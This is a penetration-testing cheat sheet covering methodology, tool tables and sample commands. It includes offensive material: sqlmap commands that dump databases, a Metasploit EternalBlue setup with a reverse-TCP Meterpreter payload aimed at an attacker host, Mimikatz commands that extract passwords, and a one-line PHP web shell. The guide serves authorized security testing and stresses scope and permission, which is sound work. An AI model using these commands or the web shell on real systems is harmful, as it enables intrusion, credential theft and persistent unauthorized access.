# Penetration Testing (Pentesting) Cheat Sheet

A comprehensive guide for penetration testers covering key phases, tools, methodologies, and best practices. Use this cheat sheet to systematically identify and exploit vulnerabilities in systems, networks, and applications.

---

## 1. Pentesting Methodology

Penetration testing follows a structured methodology to uncover and exploit vulnerabilities within a target environment. The typical pentesting process follows these five main stages:

### 1.1. Planning and Reconnaissance
- **Goal:** Define the scope, objectives, and rules of engagement. Gather information about the target to understand its infrastructure, technologies, and weaknesses.
- **Activities:**
  - Define scope, rules, and authorization.
  - Identify and map potential targets.
  - Set up environment and tools for testing.

### 1.2. Scanning and Enumeration
- **Goal:** Identify active hosts, open ports, services, and other network characteristics.
- **Activities:**
  - **Port Scanning:** Use tools like Nmap to discover open ports.
  - **Service Fingerprinting:** Identify services and versions (e.g., HTTP, FTP).
  - **OS Detection:** Determine the operating system in use.
  - **Enumeration:** Extract specific data such as user accounts, shares, and service information.

### 1.3. Exploitation
- **Goal:** Attempt to exploit vulnerabilities identified in the previous stages to gain access.
- **Activities:**
  - Execute payloads, test known vulnerabilities, and deploy exploitation frameworks.
  - Escalate privileges if access is gained.
  - Ensure exploitation remains within the agreed rules.

### 1.4. Post-Exploitation
- **Goal:** Assess the extent of access gained, collect sensitive data, and attempt privilege escalation.
- **Activities:**
  - Identify sensitive information or assets (e.g., databases, credentials).
  - Attempt lateral movement within the network.
  - Maintain persistence if necessary, with caution to avoid damage.

### 1.5. Reporting and Remediation
- **Goal:** Document findings, impact, exploited vulnerabilities, and remediation recommendations.
- **Activities:**
  - Summarize findings, document proof of concept, and suggest remediation.
  - Conduct a debrief with stakeholders and provide an actionable remediation roadmap.

---

## 2. Reconnaissance and Information Gathering Tools

| **Tool**      | **Description**                                              |
|---------------|--------------------------------------------------------------|
| **Nmap**      | Network discovery and port scanning.                         |
| **Recon-ng**  | Framework for gathering OSINT and data on target environments.|
| **theHarvester** | Collect emails, subdomains, and IPs from public sources.    |
| **Shodan**    | Internet search engine for IoT and other connected devices.  |
| **Netcraft**  | Website and infrastructure reconnaissance tool.              |
| **DNSRecon**  | Enumerates DNS records, subdomains, and transfers.           |
| **Google Dorking** | Use search operators to uncover exposed information.     |

### Example Nmap Commands

```bash
nmap -sS -Pn -p- target_ip         # Stealth scan all ports
nmap -A target_ip                  # Aggressive scan (OS detection, service versions)
nmap -sV -p 80,443 target_ip       # Service version detection on HTTP/HTTPS ports
```

---

## 3. Scanning and Enumeration Techniques

| **Tool**         | **Description**                                              |
|------------------|--------------------------------------------------------------|
| **Nmap**         | Port scanning and service enumeration.                       |
| **Netcat (nc)**  | Networking utility to send/receive data and enumerate services.|
| **Nikto**        | Web server scanner to detect outdated software and misconfigurations. |
| **Enum4linux**   | Enumerates SMB shares and users on Windows systems.          |
| **SMBClient**    | Interacts with SMB shares on Windows and Samba systems.      |
| **Dirbuster / Gobuster** | Directory and file brute-forcing on web servers.       |
| **Wfuzz**        | Fuzz web applications and APIs to discover hidden parameters or directories. |

### Example Netcat Command

```bash
nc -zv target_ip 1-1000         # Scan ports 1 to 1000 on target IP
```

### Gobuster Directory Brute-forcing

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## 4. Vulnerability Scanning

| **Tool**         | **Description**                                              |
|------------------|--------------------------------------------------------------|
| **Nessus**       | Comprehensive vulnerability scanner for various platforms.   |
| **OpenVAS**      | Open-source vulnerability scanner, useful for network and web vulnerabilities. |
| **Nikto**        | Scans web servers for outdated versions and configuration issues. |
| **SQLMap**       | Automated tool for SQL injection testing and exploitation.    |
| **WPScan**       | WordPress vulnerability scanner to check plugins, themes, and user enumeration. |

### Example SQLMap Commands

```bash
sqlmap -u "http://target.com/page?id=1" --dbs          # Enumerate databases on vulnerable parameter
sqlmap -u "http://target.com/page?id=1" --dump-all     # Dump all data from vulnerable database
```

---

## 5. Exploitation Tools and Techniques

| **Tool**            | **Description**                                              |
|---------------------|--------------------------------------------------------------|
| **Metasploit**      | Popular exploitation framework for executing payloads and managing sessions. |
| **BeEF**            | Tool for exploiting client-side vulnerabilities through the browser. |
| **Cobalt Strike**   | Advanced threat emulation tool for red team operations.      |
| **Empire**          | Post-exploitation tool for PowerShell-based exploitation on Windows systems. |
| **Responder**       | Network tool to capture and exploit LAN authentication protocols. |

### Basic Metasploit Usage

1. **Search for Exploits:**

    ```bash
    search <vulnerability or software>
    ```

2. **Select an Exploit:**

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```

3. **Set Parameters:**

    ```bash
    set RHOST target_ip
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST attacker_ip
    ```

4. **Run the Exploit:**

    ```bash
    exploit
    ```

---

## 6. Post-Exploitation and Privilege Escalation

| **Technique / Tool**    | **Description**                                           |
|-------------------------|-----------------------------------------------------------|
| **Privilege Escalation Scripts** | Use LinPEAS for Linux or WinPEAS for Windows to find escalation opportunities. |
| **Mimikatz**            | Tool to extract passwords, PINs, and Kerberos tickets on Windows. |
| **BloodHound**          | Tool for Active Directory enumeration and privilege escalation paths. |
| **CrackMapExec**        | Automates post-exploitation on Windows networks (SMB, LDAP, WinRM). |
| **PowerUp**             | PowerShell script for privilege escalation on Windows systems. |

### Mimikatz Example (Extracting Plaintext Passwords)

```bash
privilege::debug
sekurlsa::logonpasswords
```

### LinPEAS Example (Linux Privilege Escalation)

```bash
./linpeas.sh
```

---

## 7. Persistence Techniques

| **Technique**          | **Description**                                           |
|------------------------|-----------------------------------------------------------|
| **Scheduled Tasks**     | Create recurring tasks to re-establish access.            |
| **Startup Programs**    | Add scripts or programs to system startup folders.        |
| **DLL Injection**       | Inject malicious DLLs into legitimate processes to evade detection. |
| **Web Shells**          | Upload web shells to compromised web servers for remote control. |
| **Registry Keys**       | Modify registry keys on Windows for persistence (e.g., HKCU\Software\Microsoft\Windows\CurrentVersion\Run). |

### Example Web Shell (PHP)

```php
<?php system($_GET['cmd']); ?>
```

---

## 8. Reporting and Documentation

A high-quality pentesting report includes:

1. **Executive Summary:** Non-technical overview of findings, impacts, and recommendations.
2. **Detailed Findings:** Document all vulnerabilities, steps to reproduce, and severity.
3. **Exploitation Details:** Proof of concept for each vulnerability (payloads or commands used).
4. **Remediation Recommendations:** Patching, configuration changes, or security controls.
5. **Appendix:** Technical details, logs, and tool outputs as supplementary evidence.

---

## 9. Common Pentesting Tools by Category

| **Category**            | **Tools**                                                  |
|-------------------------|------------------------------------------------------------|
| **Reconnaissance**       | Nmap, Recon-ng, theHarvester, Shodan                       |
| **Scanning & Enumeration** | Nmap, Netcat, Nikto, Enum4linux, Gobuster                 |
| **Vulnerability Scanning** | Nessus, OpenVAS, Nikto, SQLMap                           |
| **Exploitation**         | Metasploit, Cobalt Strike, BeEF, Responder                |
| **Post-Exploitation**   

 | Mimikatz, BloodHound, CrackMapExec, WinPEAS, LinPEAS       |
| **Persistence**          | Scheduled Tasks, Registry Keys, Web Shells, DLL Injection |
| **Password Cracking**    | John the Ripper, Hashcat, Hydra, Medusa                   |

---

## 10. Pentesting Best Practices

- **Follow Scope and Rules of Engagement:** Define clear boundaries and obtain written authorization.
- **Document Actions:** Keep detailed notes of each step taken for reporting and auditing.
- **Use Non-Destructive Testing Techniques:** Avoid testing techniques that could disrupt services unless explicitly authorized.
- **Limit Privilege Escalation and Lateral Movement:** Minimize invasive actions and only escalate when required.
- **Practice Operational Security (OPSEC):** Use VPNs, anonymization, and encrypted storage for sensitive data.
